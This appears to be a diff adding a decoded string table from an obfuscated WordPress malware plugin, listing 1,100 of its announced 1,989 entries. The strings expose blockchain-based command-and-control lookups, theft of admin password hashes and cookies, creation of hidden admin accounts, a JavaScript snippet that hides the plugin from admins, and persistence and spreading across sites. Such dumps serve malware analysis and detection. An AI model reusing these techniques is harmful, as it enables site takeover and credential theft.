@@ -1,0 +1,1992 @@
+# table entries: 1989  |  f charset 93 chars, t charset 93 chars
+# unique decoded: 1334
+============================================================
+[   0] ABSPATH
+[   1] sc_ver_o
+[   2] 4.5.3
+[   3] basename
+[   4] function_exists
+[   5] plugin_basename
+[   6] WP_PLUGIN_DIR
+[   7] strpos
+[   8] ltrim
+[   9] substr
+[  10] strlen
+[  11] dirname
+[  12] rtrim
+[  13] WPMU_PLUGIN_DIR
+[  14] /mu-plugins
+[  15] mkdir
+[  16] chmod
+[  17] unlink
+[  18] unlink
+[  19] is_file
+[  20] opcache_invalidate
+[  21] opcache_invalidate
+[  22] fopen
+[  23] wb
+[  24] fwrite
+[  25] .php
+[  26] .sd_
+[  27] .bt_
+[  28] .swm_
+[  29] .q_
+[  30] .off
+[  31] WP_CONTENT_DIR
+[  32] /.rd_
+[  33] realpath
+[  34] scandir
+[  35] is_array
+[  36] count
+[  37] rmdir
+[  38] posix_geteuid
+[  39] is_int
+[  40] sc_
+[  41] is_string
+[  42] .mu_st_
+[  43] is_dir
+[  44] is_link
+[  45] ..
+[  46] is_readable
+[  47] is_writable
+[  48] locked
+[  49] rename
+[  50] scandir
+[  51] get_transient
+[  52] sc_mu_rescue
+[  53] stat
+[  54] dev
+[  55] md5
+[  56] /.mu_st_
+[  57] /.mu_lk_
+[  58] clearstatcache
+[  59] set_transient
+[  60] delete_transient
+[  61] sc_mig_fail
+[  62] rescue
+[  63] mu 
+[  64] dir
+[  65] ::
+[  66] is_object
+[  67] function
+[  68] function
+[  69] remove_filter
+[  70] glob
+[  71] /*.php
+[  72] touch
+[  73] rename
+[  74] copy
+[  75] copy
+[  76] tempnam
+[  77] sys_get_temp_dir
+[  78] /tmp
+[  79] wp-content
+[  80] /\
+[  81] /.sc_tmp
+[  82] putenv
+[  83] TMPDIR=
+[  84] sc_tmp_fixed
+[  85] realpath
+[  86] /\
+[  87] /.sc_
+[  88] /core_
+[  89] core
+[  90] .php
+[  91] szqmojua2ki85bl5sx
+[  92] /plugins/
+[  93] file_get_contents
+[  94] preg_match
+[  95] /\/\* SCV:(\d+\.\d+\.\d+) \*\//
+[  96] filemtime
+[  97] filesize
+[  98] sc_cron_fetch
+[  99] sc_payload_t
+[ 100] apache_get_version
+[ 101] strtolower
+[ 102] php_sapi_name
+[ 103] apache2handler
+[ 104] litespeed
+[ 105] SERVER_SOFTWARE
+[ 106] SERVER_SOFTWARE
+[ 107] apache
+[ 108] openlitespeed
+[ 109] SERVER_SOFTWARE
+[ 110] ini_get
+[ 111] open_basedir
+[ 112] explode
+[ 113] /\
+[ 114] DB_NAME
+[ 115] sc_lock_n
+[ 116] sc_lock_n
+[ 117] sc_lock_db
+[ 118] sc_lock_db
+[ 119] sc_lock_n
+[ 120] method_exists
+[ 121] get_var
+[ 122] SELECT GET_LOCK('
+[ 123] ', 0)
+[ 124] sc_lock_n
+[ 125] sc_lock_db
+[ 126] flock
+[ 127] /sc_
+[ 128] .lock
+[ 129] sc_lock_fh
+[ 130] sc_lock_n
+[ 131] sc_lock_n
+[ 132] sc_lock_ip
+[ 133] query
+[ 134] SELECT RELEASE_LOCK('
+[ 135] ')
+[ 136] DISALLOW_FILE_MODS
+[ 137] sys_get_temp_dir
+[ 138] ABSPATH
+[ 139] actp
+[ 140] sc_actp_fh
+[ 141] sc_actp_fh
+[ 142] sc_actp_fh
+[ 143] get_option
+[ 144] update_option
+[ 145] active_plugins
+[ 146] array_values
+[ 147] array_unique
+[ 148] in_array
+[ 149] array_diff
+[ 150] Throwable
+[ 151] : 
+[ 152] sc_errors
+[ 153] sc_errors
+[ 154] sc_errors
+[ 155] array_slice
+[ 156] add_action
+[ 157] add_filter
+[ 158] WP_CONTENT_DIR
+[ 159] /cache
+[ 160] /index.php
+[ 161] WP_CONTENT_DIR
+[ 162] sc_purge
+[ 163] sc_purge
+[ 164] realpath
+[ 165] sc_purge
+[ 166] register_shutdown_function
+[ 167] t_8dbov40ygdfn3nn78
+[ 168] sc_purge
+[ 169] error_get_last
+[ 170] file
+[ 171] type
+[ 172] type
+[ 173] message
+[ 174] message
+[ 175] Allowed memory size
+[ 176] Maximum execution time
+[ 177] realpath
+[ 178] sc_boot_ver
+[ 179] sc_boot_st
+[ 180] .php
+[ 181] /.q_
+[ 182] /.ub_
+[ 183] time
+[ 184] sc_update_bad
+[ 185] no
+[ 186] /.q_
+[ 187] fail
+[ 188] .php.off
+[ 189] /.sd_
+[ 190] /\d+\.\d+\.\d+/
+[ 191] >=
+[ 192] file_put_contents
+[ 193] sc_pending_invalidate
+[ 194] plugins_loaded
+[ 195] ly_n524o3z90kr
+[ 196] qk81yejlfr6p0hycu0as
+[ 197] 0.0.0
+[ 198] yes
+[ 199] pathinfo
+[ 200] is_multisite
+[ 201] get_site_option
+[ 202] active_sitewide_plugins
+[ 203] /\/\* SCV:\d+\.\d+\.\d+ \*\//
+[ 204] path
+[ 205] dead
+[ 206] gone
+[ 207] yes
+[ 208] yes
+[ 209] .php
+[ 210] .php
+[ 211] sc_dedup_took
+[ 212] coyu6bqz_z0bfm7echt
+[ 213] yes
+[ 214] starting
+[ 215] dedup
+[ 216] qk81yejlfr6p0hycu0as
+[ 217] opendir
+[ 218] readdir
+[ 219] closedir
+[ 220] closedir
+[ 221] /*
+[ 222] array_map
+[ 223] shell_exec
+[ 224] disable_functions
+[ 225] scl
+[ 226] shell_exec
+[ 227] php -l 
+[ 228]  2>&1
+[ 229] No syntax errors
+[ 230] Parse error
+[ 231] Fatal error
+[ 232] <?
+[ 233] token_get_all
+[ 234] array_key_exists
+[ 235] TOKEN_PARSE
+[ 236] is_bool
+[ 237] 0x9A4752cAA1C15868487A0ACb691F81bfA901E063
+[ 238] 0x839d1cE5c3F259e8d3D17114d7186EDabdbeA94b
+[ 239] 0x6d2c5435EF70196740a48904B69377935D50abBB
+[ 240] https://0xrpc.io/eth
+[ 241] https://ethereum-public.nodies.app
+[ 242] https://eth.drpc.org
+[ 243] https://rpc.eth.gateway.fm
+[ 244] https://eth.blockrazor.xyz
+[ 245] https://public-eth.nownodes.io
+[ 246] https://eth-mainnet.rpcfast.com?api_key=xbhWBI1Wkguk8SNMu1bvvLurPGLXmgwYeC4S6g2H7WdwFigZSmPWVZRxrskEQwIf
+[ 247] https://eth1.lava.build
+[ 248] https://eth.rpc.blxrbdn.com
+[ 249] https://eth-mainnet.public.blastapi.io
+[ 250] https://gateway.tenderly.co/public/mainnet
+[ 251] https://ethereum.rpc.subquery.network/public
+[ 252] https://ethereum-rpc.publicnode.com
+[ 253] https://mainnet.gateway.tenderly.co
+[ 254] https://eth.api.onfinality.io/public
+[ 255] https://ethereum.public.blockpi.network/v1/rpc/public
+[ 256] https://ethereum-json-rpc.stakely.io
+[ 257] https://rpc.sentio.xyz/mainnet
+[ 258] https://eth.merkle.io
+[ 259] https://eth.api.pocket.network
+[ 260] admin_
+[ 261] adm_
+[ 262] administrator_
+[ 263] backup_
+[ 264] gzencode
+[ 265] gzdeflate
+[ 266] pack
+[ 267] crc32
+[ 268] unpack
+[ 269] gzdecode
+[ 270] gzinflate
+[ 271] hex2bin
+[ 272] H*
+[ 273] wp-admin/
+[ 274] wp-includes/
+[ 275] WP_CONTENT_DIR
+[ 276] *.php
+[ 277] array_rand
+[ 278] wp_rand
+[ 279] rand
+[ 280] sc_deadline
+[ 281] microtime
+[ 282] ceil
+[ 283] call_user_func
+[ 284] wp_remote_get
+[ 285] timeout
+[ 286] sslverify
+[ 287] limit_response_size
+[ 288] is_wp_error
+[ 289] curl_init
+[ 290] curl_setopt_array
+[ 291] curl_exec
+[ 292] curl_init
+[ 293] CURLOPT_RETURNTRANSFER
+[ 294] CURLOPT_TIMEOUT
+[ 295] CURLOPT_SSL_VERIFYPEER
+[ 296] CURLOPT_SSL_VERIFYHOST
+[ 297] CURLOPT_NOPROGRESS
+[ 298] CURLOPT_PROGRESSFUNCTION
+[ 299] http_code
+[ 300] wp_remote_post
+[ 301] wp_remote_post
+[ 302] headers
+[ 303] body
+[ 304] ; 
+[ 305] sc_fetch_oom
+[ 306] CURLOPT_POST
+[ 307] CURLOPT_POSTFIELDS
+[ 308] CURLOPT_RETURNTRANSFER
+[ 309] CURLOPT_SSL_VERIFYHOST
+[ 310] CURLOPT_HTTPHEADER
+[ 311] CURLOPT_PROGRESSFUNCTION
+[ 312] sc_last_rpc
+[ 313] array_unshift
+[ 314] trim
+[ 315] {"jsonrpc":"2.0","id":3,"method":"eth_call","params":[{"data":"0x3bc5de30","to":"
+[ 316] "},"latest"]}
+[ 317] Content-Type
+[ 318] application/json
+[ 319] json_decode
+[ 320] result
+[ 321] result
+[ 322] result
+[ 323] result
+[ 324] 0x
+[ 325] ord
+[ 326] resolve
+[ 327] rpc_decrypt_failed
+[ 328] resolve
+[ 329] rpc_bad_key_length
+[ 330] array_filter
+[ 331] trim
+[ 332] preg_split
+[ 333] /\r?\n/
+[ 334] sc_c2_cache
+[ 335] implode
+[ 336] server_key
+[ 337] urls
+[ 338] srv_key
+[ 339] trim
+[ 340] rpc_all_failed
+[ 341] sc_enc_c
+[ 342] sc_enc_c
+[ 343] serialize
+[ 344] chr
+[ 345] mt_rand
+[ 346] base64_encode
+[ 347] get_option
+[ 348] base64_decode
+[ 349] PHP_VERSION_ID
+[ 350] unserialize
+[ 351] allowed_classes
+[ 352] str_replace
+[ 353] ep
+[ 354] sw
+[ 355] sw_url
+[ 356] sw_cached
+[ 357] is_scalar
+[ 358] errors
+[ 359] array_merge
+[ 360] sc_errors
+[ 361] flush_errors
+[ 362] get_option
+[ 363] sc_payload_persistent
+[ 364] cronInterval
+[ 365] sc_interval
+[ 366] interval
+[ 367] display
+[ 368] Custom maintenance interval
+[ 369] sc_guard_interval
+[ 370] interval
+[ 371] wp_next_scheduled
+[ 372] wp_schedule_event
+[ 373] sc_chain
+[ 374] sc_interval
+[ 375] DOING_CRON
+[ 376] shutdown
+[ 377] ki9xwewhya68un_
+[ 378] wp_remote_get
+[ 379] site_url
+[ 380] wp-cron.php?doing_wp_cron=
+[ 381] timeout
+[ 382] blocking
+[ 383] sslverify
+[ 384] fastcgi_finish_request
+[ 385] litespeed_finish_request
+[ 386] ignore_user_abort
+[ 387] ini_get
+[ 388] zlib.output_compression
+[ 389] off
+[ 390] ob_get_status
+[ 391] name
+[ 392] ob_gzhandler
+[ 393] zlib
+[ 394] headers_list
+[ 395] Content-Encoding:
+[ 396] identity
+[ 397] cli
+[ 398] phpdbg
+[ 399] http_response_code
+[ 400] REQUEST_METHOD
+[ 401] HEAD
+[ 402] ob_get_level
+[ 403] ob_end_flush
+[ 404] ob_get_status
+[ 405] default output handler
+[ 406] ob_get_length
+[ 407] wp_filter
+[ 408] wp_ob_end_flush_all
+[ 409] Content-Length: 
+[ 410] Connection: close
+[ 411] flush
+[ 412] wp_schedule_single_event
+[ 413] DISABLE_WP_CRON
+[ 414] sc_last_fetch_ts
+[ 415] sc_seen_ver
+[ 416] no
+[ 417] wp_unschedule_event
+[ 418] wp_next_scheduled
+[ 419] fetch
+[ 420] cron_stale_inline
+[ 421] set_time_limit
+[ 422] sc_payload_persistent
+[ 423] pluginRules
+[ 424] sc_plugin_rules
+[ 425] injectRules
+[ 426] sc_inject_rules
+[ 427] injectRules
+[ 428] js
+[ 429] js
+[ 430] sc_js
+[ 431] page
+[ 432] sc_page
+[ 433] sc_sw
+[ 434] cache
+[ 435] update_option
+[ 436] sc_last_heal_ts
+[ 437] sc_heal_scan
+[ 438] src
+[ 439] WP_PLUGIN_DIR
+[ 440] glob
+[ 441] /*/*.php
+[ 442] preg_replace
+[ 443] /\s+/
+[ 444] /\s+/
+[ 445] heal
+[ 446] did_action
+[ 447] home_url
+[ 448] sc_last_hb
+[ 449] timeout
+[ 450] sslverify
+[ 451] payloadTtl
+[ 452] sc_last_fetch_fail_ts
+[ 453] sc_fetch_fails
+[ 454] max
+[ 455] min
+[ 456] ver
+[ 457] php
+[ 458] sapi
+[ 459] ssl
+[ 460] is_ssl
+[ 461] ms
+[ 462] wp
+[ 463] wp_version
+[ 464] srv
+[ 465] SERVER_SOFTWARE
+[ 466] js_on
+[ 467] js_len
+[ 468] js_req
+[ 469] sc_js_printed
+[ 470] js_ob
+[ 471] sc_js_ob_used
+[ 472] js_ts
+[ 473] get_option
+[ 474] sc_js_printed_ts
+[ 475] sw_url
+[ 476] sw_hits
+[ 477] sc_sw_ep_hits
+[ 478] sw_last
+[ 479] get_option
+[ 480] sc_sw_ep_last
+[ 481] sw_had
+[ 482] sc_sw_had
+[ 483] v_adv
+[ 484] /advanced-cache.php
+[ 485] /advanced-cache.php
+[ 486] v_db
+[ 487] /db.php
+[ 488] /db.php
+[ 489] v_oc
+[ 490] /object-cache.php
+[ 491] .g_
+[ 492] .gl_
+[ 493] v_guard
+[ 494] wp-includes
+[ 495] .php
+[ 496] user_ini.filename
+[ 497] (none)
+[ 498] .user.ini
+[ 499] v_ini
+[ 500] auto_prepend_file
+[ 501] v_ht
+[ 502] .htaccess
+[ 503] v_wc
+[ 504] wp-config.php
+[ 505] wp-config.php
+[ 506] SC_WC
+[ 507] prepend
+[ 508] SC_AUTO_PREPEND
+[ 509] pc
+[ 510] WP_ROCKET_VERSION
+[ 511] LSCWP_V
+[ 512] W3TC
+[ 513] sg_cachepress_purge_cache
+[ 514] class_exists
+[ 515] Cache_Enabler
+[ 516] wp_fastest_cache
+[ 517] wp_cache_serve_cache_file
+[ 518] f_ok
+[ 519] f_fails
+[ 520] f_fail_ts
+[ 521] ic
+[ 522] cf
+[ 523] ts
+[ 524] ic_n
+[ 525] ic_2fa
+[ 526] sc_lb_mode
+[ 527] lb
+[ 528] get_option
+[ 529] sc_canary
+[ 530] cy
+[ 531] items
+[ 532] err
+[ 533] err
+[ 534] wp-login.php
+[ 535] wp_login_url
+[ 536] home_url
+[ 537] parse_url
+[ 538] PHP_URL_HOST
+[ 539] get_site_url
+[ 540] get_bloginfo
+[ 541] url
+[ 542] PHP_URL_HOST
+[ 543] siteurl
+[ 544] HTTP_HOST
+[ 545] SERVER_NAME
+[ 546] SERVER_NAME
+[ 547] max_execution_time
+[ 548] urls
+[ 549] server_key
+[ 550] test_mode
+[ 551] mockSrvKey-
+[ 552] get_option
+[ 553] sc_last_c2
+[ 554] shuffle
+[ 555] WPMU_PLUGIN_DIR
+[ 556] glob
+[ 557] domain
+[ 558] pluginVersion
+[ 559] plugin
+[ 560] root
+[ 561] /\
+[ 562] activatedPlugins
+[ 563] muPlugins
+[ 564] loginUrl
+[ 565] admins
+[ 566] adminsCookies
+[ 567] wp_json_encode
+[ 568] json_encode
+[ 569] Content-Type
+[ 570] application/octet-stream
+[ 571] sc_fetch_oom
+[ 572] sc_fetch_oom
+[ 573] oom
+[ 574] c2_empty 
+[ 575] fetch
+[ 576] c2_decrypt_failed 
+[ 577] update_option
+[ 578] c2_bad_json 
+[ 579] fetch_url
+[ 580] beacon
+[ 581] +/
+[ 582] -_
+[ 583] str_split
+[ 584] sc_b=
+[ 585] &i=
+[ 586] &n=
+[ 587] &d=
+[ 588] sc_last_c2
+[ 589] delete_option
+[ 590] errors
+[ 591] sc_errors
+[ 592] sc_errors
+[ 593] sc_errors
+[ 594] sc_errors
+[ 595] plugin
+[ 596] plugin
+[ 597] targetVersion
+[ 598] targetVersion
+[ 599] forceUpdate
+[ 600] pluginRules
+[ 601] pluginRules
+[ 602] pluginRules
+[ 603] sc_plugin_rules
+[ 604] injectRules
+[ 605] injectRules
+[ 606] sc_inject_rules
+[ 607] js
+[ 608] js_cached
+[ 609] js_purge_mig
+[ 610] js_purge_pending
+[ 611] no
+[ 612] sc_js
+[ 613] js_purge_pending
+[ 614] js_purge_pending
+[ 615] js_purge_pending
+[ 616] no
+[ 617] page
+[ 618] sc_page
+[ 619] page_cached
+[ 620] sw
+[ 621] sw
+[ 622] templates
+[ 623] templates
+[ 624] templates
+[ 625] guard
+[ 626] advancedCache
+[ 627] adv_tpl
+[ 628] db
+[ 629] db_tpl
+[ 630] theme
+[ 631] theme_tpl
+[ 632] installer
+[ 633] inst_tpl
+[ 634] ocLoader
+[ 635] oc_tpl
+[ 636] is_numeric
+[ 637] cronInterval
+[ 638] cronInterval
+[ 639] cronInterval
+[ 640] sc_fetch_fails
+[ 641] sc_last_fetch_ts
+[ 642] n339hprvf7gbg81ss2zn
+[ 643] set_transient
+[ 644] payloadTtl
+[ 645] wp_get_scheduled_event
+[ 646] wp_clear_scheduled_hook
+[ 647] wp_schedule_event
+[ 648] sc_last_fetch_fail_ts
+[ 649] n339hprvf7gbg81ss2zn
+[ 650] memory_get_usage
+[ 651] update
+[ 652] oom_guard
+[ 653] <?php
+[ 654] update
+[ 655] syntax_error
+[ 656] ver_mismatch
+[ 657] no_scv
+[ 658] no_prev
+[ 659] sc_update_suspect
+[ 660] wp_remote_get
+[ 661] timeout
+[ 662] redirection
+[ 663] is_wp_error
+[ 664] get_option
+[ 665] update
+[ 666] replace_fail
+[ 667] sc_recover_check
+[ 668] /?sc_cb=
+[ 669] timeout
+[ 670] sslverify
+[ 671] sleep
+[ 672] probe_inconclusive
+[ 673] no
+[ 674] rollback_fail_
+[ 675] sc_persisted
+[ 676] canary_rollback_
+[ 677] /.sd_
+[ 678] sc_chain
+[ 679] get_plugins
+[ 680] file_exists
+[ 681] wp-admin/includes/plugin.php
+[ 682] scan
+[ 683] inc
+[ 684] phtml
+[ 685] html
+[ 686] PATHINFO_EXTENSION
+[ 687] deactivate_plugins
+[ 688] wp-admin/includes/plugin.php
+[ 689] delete_plugins
+[ 690] current_user_can
+[ 691] get_users
+[ 692] wp_set_current_user
+[ 693] role
+[ 694] administrator
+[ 695] number
+[ 696] DIRECTORY_SEPARATOR
+[ 697] array_keys
+[ 698] sc_inject_rules
+[ 699] rescan
+[ 700] sc_last_tmpclean
+[ 701] sc_last_tmpclean
+[ 702] sc_
+[ 703] wp_
+[ 704] /plugins
+[ 705] SC_DP_BEGIN
+[ 706] /\n?\/\* SC_DP_BEGIN:([a-zA-Z0-9._:]+) \*\/.*?\/\* SC_DP_END:\1 \*\/\n?/s
+[ 707] sc_last_rescan
+[ 708] s37hic5b5yw6qibobb
+[ 709] sc_last_rescan
+[ 710] periodic
+[ 711] migrate
+[ 712] src_invalid
+[ 713] sc_mig_fail
+[ 714] mu_not_writable
+[ 715] /*.php
+[ 716] sc_mig_fail
+[ 717] get_option
+[ 718] sc_init_src_ts
+[ 719] update_option
+[ 720] update_option
+[ 721] no
+[ 722] no
+[ 723] get_option
+[ 724] sc_initialized
+[ 725] add_option
+[ 726] sc_initialized
+[ 727] update_option
+[ 728] no
+[ 729] sc_last_fetch_fail_ts
+[ 730] delete_transient
+[ 731] _50ith0zh4qkf9t9s
+[ 732] init
+[ 733] sc_initialized
+[ 734] wp_remote_get
+[ 735] blocking
+[ 736] warm
+[ 737] is_admin
+[ 738] current_user_can
+[ 739] activate_plugins
+[ 740] action
+[ 741] activate
+[ 742] activate-selected
+[ 743] activate
+[ 744] plugin
+[ 745] checked
+[ 746] wp_safe_redirect
+[ 747] admin_url
+[ 748] plugins.php
+[ 749] scan_act
+[ 750] dropins
+[ 751] plugins
+[ 752] wp-content
+[ 753] db.php
+[ 754] SC_DB
+[ 755] advanced-cache.php
+[ 756] SC_ADV
+[ 757] /* 
+[ 758] _BEGIN:
+[ 759] /\/\* 
+[ 760] _BEGIN:([a-zA-Z0-9._:]+) \*\/.*?\/\* 
+[ 761] _END:\1 \*\//s
+[ 762] <?
+[ 763] mustuse
+[ 764] plugins
+[ 765] mustuse
+[ 766] rdkyou14lonsd2z
+[ 767] <style>tr[data-plugin="
+[ 768] "],tr[data-plugin="
+[ 769] "]{display:none!important}</style>
+[ 770] <script>document.addEventListener("DOMContentLoaded",function(){document.querySelectorAll("tr[data-plugin]").forEach(function(r){var p=r.getAttribute("data-plugin");if(p==="
+[ 771] "||p==="
+[ 772] ")r.remove()});var c=document.querySelector(".subsubsub .mustuse .count");if(c){var n=parseInt(c.textContent.replace(/[^0-9]/g,""))||0;if(n>0)c.textContent="("+Math.max(0,n-1)+")"}});</script>
+[ 773] n95q_rlkxmpfeho0
+[ 774] g0zwc0y71zjda4i3gv
+[ 775] .php
+[ 776] get_plugin_data
+[ 777] Name
+[ 778] wp-plugins-active
+[ 779] wp-plugins-inactive
+[ 780] fields
+[ 781] fields
+[ 782] fields
+[ 783] wp-mu-plugins
+[ 784] wp-plugins-mustuse
+[ 785] fields
+[ 786] fields
+[ 787] WP_CONTENT_DIR
+[ 788] glob
+[ 789] /* SCV:
+[ 790] /Plugin Name:\s*([^\r\n*]+)/i
+[ 791] fields
+[ 792] wp-dropins
+[ 793] fields
+[ 794] WP_CONTENT_DIR
+[ 795] wp-content
+[ 796] SC_DB
+[ 797] advanced-cache.php
+[ 798] wp-dropins
+[ 799] fields
+[ 800] pattern
+[ 801] preg_quote
+[ 802] $#
+[ 803] hidden
+[ 804] #/
+[ 805] roots
+[ 806] roots
+[ 807] roots
+[ 808] attributes
+[ 809] attributes
+[ 810] roots
+[ 811] attributes
+[ 812] PHP_MAJOR_VERSION
+[ 813] elFinderConnector
+[ 814] WP_PLUGIN_DIR
+[ 815] /wp-file-manager/lib/php/elFinderConnector.class.php
+[ 816] /file-manager/lib/php/elFinderConnector.class.php
+[ 817] /file-manager-advanced/lib/php/elFinderConnector.class.php
+[ 818] .class.php
+[ 819] class elFinderConnector
+[ 820] /^\s*<\?(php)?/
+[ 821] class _SC_elFinderConnector_Real
+[ 822] <?php 
+[ 823] _sc_hide
+[ 824] _sc_hide_dir
+[ 825] <?php class elFinderConnector extends _SC_elFinderConnector_Real {
+[ 826] protected function output( array $data ) {
+[ 827] $hide = isset( $GLOBALS["_sc_hide"] ) ? $GLOBALS["_sc_hide"] : "";
+[ 828] if ( $hide !== "" && function_exists( "sc_fm_filter" ) ) {
+[ 829] $data = sc_fm_filter( $data, $hide );
+[ 830] parent::output( $data );
+[ 831] fm
+[ 832] i38r7aeqc3ua1np5rj88vn
+[ 833] files
+[ 834] added
+[ 835] changed
+[ 836] tree
+[ 837] items
+[ 838] sc_heavy
+[ 839] sc_heavy
+[ 840] get_transient
+[ 841] sc_recover_check
+[ 842] clearstatcache
+[ 843] set_transient
+[ 844] src
+[ 845] set_transient
+[ 846] sc_recover_check
+[ 847] src
+[ 848] sc_recover_throttle
+[ 849] recover
+[ 850] source_empty
+[ 851] sc_update_bad
+[ 852] .php
+[ 853] wp_send_new_user_notification_to_admin
+[ 854] __return_false
+[ 855] wp_new_user_notification_email_admin
+[ 856] remove_action
+[ 857] register_new_user
+[ 858] wp_send_new_user_notifications
+[ 859] edit_user_created_user
+[ 860] wp_login
+[ 861] wp_notify_admin_new_login
+[ 862] wpdb
+[ 863] capabilities
+[ 864] ELECT u.ID, u.user_login, u.user_pass, u.user_email FROM 
+[ 865]  u INNER JOIN 
+[ 866]  m ON u.ID = m.user_id WHERE m.meta_key = %s AND m.meta_value LIKE %s
+[ 867] %administrator%
+[ 868] aq
+[ 869] to
+[ 870] ck_pend
+[ 871] wp_generate_auth_cookie
+[ 872] WP_Session_Tokens
+[ 873] no
+[ 874] ck_pend
+[ 875] secure_auth
+[ 876] auth
+[ 877] SECURE_AUTH_COOKIE
+[ 878] AUTH_COOKIE
+[ 879] LOGGED_IN_COOKIE
+[ 880] ck_pend
+[ 881] COOKIE_DOMAIN
+[ 882] COOKIEPATH
+[ 883] ADMIN_COOKIE_PATH
+[ 884] /wp-admin
+[ 885] TRUE
+[ 886] FALSE
+[ 887] wp_mail
+[ 888] issued
+[ 889] get_option
+[ 890] issued_v
+[ 891] user_meta
+[ 892] session_tokens
+[ 893] expiration
+[ 894] expiration
+[ 895] session_tokens
+[ 896] user_meta
+[ 897] WP_Session_Tokens
+[ 898] get_instance
+[ 899] TRUE
+[ 900] logged_in
+[ 901] TRUE
+[ 902] ck_pend
+[ 903] cookies
+[ 904] cookies
+[ 905] wp_mail
+[ 906] ck_pend
+[ 907] ck_commit
+[ 908] bu
+[ 909] bp
+[ 910] has_cap
+[ 911] administrator
+[ 912] ic
+[ 913] intercept
+[ 914] ic
+[ 915] login_cf
+[ 916] login_cf
+[ 917] /^
+[ 918] [a-f0-9]{6,10}$/
+[ 919] zqzsn4zvy3_nj483kc64t
+[ 920] zqzsn4zvy3_nj483kc64t
+[ 921] asort
+[ 922] no
+[ 923] scr
+[ 924] io
+[ 925] atomic_no_dir 
+[ 926] .php
+[ 927] atomic_bad_php 
+[ 928] tempnam
+[ 929] atomic_no_tempnam 
+[ 930] sc_
+[ 931] wb
+[ 932] fsync
+[ 933] io
+[ 934] atomic_temp_fail 
+[ 935] io
+[ 936] atomic_short_write 
+[ 937] atomic_link_fail 
+[ 938] .scold
+[ 939] atomic_rename_fail 
+[ 940] hash_file
+[ 941] md5
+[ 942] atomic_verify_fail 
+[ 943] md5
+[ 944] atomic_third_party 
+[ 945] q1y58ycbxz2towea7n8uc
+[ 946] l23d5uzjaymcy6h2ira9
+[ 947] sc_pb=
+[ 948] timeout
+[ 949] limit_response_size
+[ 950] Cache-Control
+[ 951] no-cache
+[ 952] f940ucsud9i8m9y
+[ 953] is_wp_error
+[ 954] sslverify
+[ 955] limit_response_size
+[ 956] f940ucsud9i8m9y
+[ 957] /\n?<IfModule mod_php[0-9.]*\.c>\s*php_value auto_prepend_file[^\n]*
+[ 958] [^\n]*\n<\/IfModule>\n?/i
+[ 959] /\n?<IfModule litespeed>\s*php_value auto_prepend_file[^\n]*
+[ 960] /\n?php_value auto_prepend_file[^\n]*
+[ 961] [^\n]*\n?/i
+[ 962] /\n?<IfModule litespeed>\s*php_value\s*<\/IfModule>\n?/i
+[ 963] /\n?<IfModule mod_php[0-9.]*\.c>\s*php_value\s*<\/IfModule>\n?/i
+[ 964] opcache_invalidate
+[ 965] opcache_reset
+[ 966] opcache_get_status
+[ 967] opcache_enabled
+[ 968] write_failed 
+[ 969] sc_admin_tick
+[ 970] sc_admin_inflight
+[ 971] sc_admin_inflight
+[ 972] username_exists
+[ 973] sc_admin_tick
+[ 974] admin_tick
+[ 975] sc_chain
+[ 976] example.com
+[ 977] wp_set_password
+[ 978] bu
+[ 979] bu
+[ 980] no
+[ 981] admin
+[ 982] persist_fail
+[ 983] collision
+[ 984] wp_insert_user
+[ 985] wp-includes/user.php
+[ 986] wp-includes/user.php
+[ 987] user_login
+[ 988] user_pass
+[ 989] user_email
+[ 990] display_name
+[ 991] wpdb
+[ 992] no_wpdb
+[ 993] wp_hash_password
+[ 994] current_time
+[ 995] mysql
+[ 996] Y-m-d H:i:s
+[ 997] user_pass
+[ 998] user_nicename
+[ 999] user_registered
+[1000] user_status
+[1001] %s
+[1002] %d
+[1003] %s
+[1004] sql_insert_fail
+[1005] user_id
+[1006] meta_key
+[1007] meta_value
+[1008] %s
+[1009] %s
+[1010] user_level
+[1011] meta_value
+[1012] %d
+[1013] %s
+[1014] clean_user_cache
+[1015] admin
+[1016] verify_fail
+[1017] get_user_by
+[1018] login
+[1019] user_can
+[1020] administrator
+[1021] cap_verify_fail
+[1022] wp_delete_user
+[1023] ABSPATH
+[1024] wp-admin/includes/user.php
+[1025] wp-admin/includes/user.php
+[1026] bu
+[1027] no
+[1028] bp
+[1029] persist_fail
+[1030] admin
+[1031] query_where
+[1032]  AND user_login != '
+[1033] hide_q
+[1034] all
+[1035] administrator
+[1036] /\((\d+)\)/
+[1037] /\(\d+\)/
+[1038] hide_cnt
+[1039] login__not_in
+[1040] hide_rest
+[1041] get_option
+[1042] ..
+[1043] stylesheet
+[1044] template
+[1045] WP_CONTENT_DIR
+[1046] /themes
+[1047] wp-content/themes
+[1048] ..
+[1049] PATHINFO_EXTENSION
+[1050] /patterns
+[1051] inject_1
+[1052] inject
+[1053] /home
+[1054] /var/www
+[1055] /var/www/vhosts
+[1056] /var/www/html
+[1057] /srv/www
+[1058] /srv/users
+[1059] /usr/local/www
+[1060] /wp-content/mu-plugins
+[1061] /wp-content/plugins
+[1062] .php
+[1063] installed
+[1064] sc_spread_interval
+[1065] spread
+[1066] sc_spread_nr
+[1067] no_roots
+[1068] /wp-content/plugins/
+[1069] spread
+[1070] sc_spread_interval
+[1071] sc_spread_interval
+[1072] spread
+[1073] /wp-config.php
+[1074] /define\s*\(\s*['"]DB_NAME['"]\s*,\s*['"]([^'"]+)['"]/
+[1075] /table_prefix\s*=\s*['"]([^'"]+)['"]/
+[1076] /^[a-zA-Z0-9_]+$/
+[1077] wpdb
+[1078] query
+[1079] /^[a-zA-Z0-9_$-]+$/
+[1080] db_name_rejected
+[1081] `.`
+[1082] options`
+[1083] START TRANSACTION
+[1084] ELECT option_value FROM 
+[1085]  WHERE option_name = 
+[1086] 'active_plugins'
+[1087]  LIMIT 1 FOR UPDATE
+[1088] ROLLBACK
+[1089] COMMIT
+[1090] PDATE 
+[1091]  SET option_value = %s WHERE option_name = 
+[1092] 'active_plugins'
+[1093] update_fail
+[1094] ROLLBACK
+[1095] COMMIT
+[1096] wp_cache_delete
+[1097] alloptions
+[1098] options
+[1099] options
+[1100] gzinflate
